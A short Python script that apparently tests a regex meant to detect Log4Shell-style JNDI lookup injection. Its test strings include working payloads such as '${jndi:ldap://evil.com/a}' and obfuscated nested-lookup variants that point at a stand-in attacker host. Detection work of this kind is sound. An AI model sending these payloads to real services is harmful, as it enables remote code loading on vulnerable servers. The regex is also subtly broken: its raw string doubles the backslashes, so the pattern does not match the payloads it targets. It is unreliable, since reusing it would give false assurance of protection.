import re

pattern = r'(?i)(?:\\$\\{[^}]*j\\s*n\\s*d\\s*i[^}]*:|\\$\\{[^}]*\\$\\{[^}]*[jJ]\\}ndi:)[^}]*?(?:ldap|rmi|dns|iiop|corba|nds|http|ldaps|ldapi)://'

test_strings = [
    "${jndi:ldap://evil.com/a}",
    "${${lower:j}ndi:ldap://evil.com/a}",
    "${j${::-n}di:rmi://evil.com/a}",
    "normal text",
    "user-agent: Mozilla/5.0",
]

for s in test_strings:
    match = re.search(pattern, s)
    print(f"{'MATCH' if match else 'no match'} — {s}")